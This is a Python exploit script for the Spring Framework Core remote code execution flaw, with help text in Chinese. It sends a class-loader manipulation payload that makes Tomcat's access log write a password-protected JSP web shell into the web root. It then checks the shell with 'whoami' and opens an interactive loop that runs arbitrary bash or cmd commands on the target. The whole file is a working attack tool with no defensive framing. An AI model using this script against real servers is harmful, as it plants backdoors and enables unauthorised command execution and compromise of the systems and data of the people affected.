import re,sys,argparse
from colorama import Fore,init
from urllib.parse import urlparse
import requests
from urllib.parse import quote
import urllib3
urllib3.disable_warnings()


def title():
    print(Fore.YELLOW + """
 .----..-.-. .---. .-..-. .-..----.     .----. .---. .---. .----.     .---. .----..----. 
{ {__-`| } }}} }}_}{ ||  \{ || |--' ___ | }`-'/ {-. \} }}_}} |__} ___ } }}_}| }`-'} |__} 
.-._} }| |-' | } \ | }| }\  {| }-`}{___}| },-.\ '-} /| } \ } '__}{___}| } \ | },-.} '__} 
`----' `-'   `-'-' `-'`-' `-'`----'     `----' `---' `-'-' `----'     `-'-' `----'`----'                                                                                        
""")
    print(Fore.YELLOW + '\t\t\t\t\t\t Spring framework Core RCE\r\n' + '\t\t\t\t\t\t\t\t  ' + Fore.LIGHTBLUE_EX + 'By:K3rwin')  


def get_args():
    parser = argparse.ArgumentParser(description="Spring framework Core 0day RCE 帮助指南")
    parser.add_argument("-u", "--url", dest="url", type=str, help="指定url")
    parser.add_argument("-s", "--system", dest="system", type=str, help="指定目标主机操作系统,默认linux,参数为win/linux", default='linux')
    args = parser.parse_args()
    url = args.url
    system = args.system
    if url:
        url = urlparse(url)
        url = url.scheme + '://' + url.netloc
    return url,system


def exp(url, system):
    Headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded"
    }
    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22k3rwin%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22k3rwin%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    if system == ("linux" or  "win"):
        if system == "linux":
            data = payload_linux
        else:
            data = payload_win
    else:
        print("system参数必须为win or linux，参数接收错误！")
        exit()
    try:
        requests.post(url, headers=Headers, data=data, timeout=5, allow_redirects=False, verify=False)
        test = requests.get(url + "/shell.jsp?pwd=k3rwin&cmd=whoami")
        if test.status_code == 200:
            print(Fore.GREEN + "spring存在RCE漏洞，上传木马地址为：" + url +"/shell.jsp?pwd=k3rwin&cmd=whoami")
            while 1:
                cmd = input("[+]输入执行的命令>>> ")
                url_shell = url + "/shell.jsp?pwd=k3rwin&cmd=%s" % quote(cmd)
                r = requests.get(url_shell) 
                resp = r.text
                result = re.findall('([^\x00]+)\n', resp)[0]
                print(Fore.GREEN + result)
    except KeyboardInterrupt:
        print("ctrl + c 终止进程")
    except Exception as e:
        print(Fore.RED + "程序异常")
        print(e)
    return 


if __name__=="__main__":
    if len(sys.argv) > 0:
        init(autoreset=True)
        title()
        url, system = get_args()
        exp(url, system)
    else:
        print("使用python3 spring-core-rce.py -h 查看详细帮助")
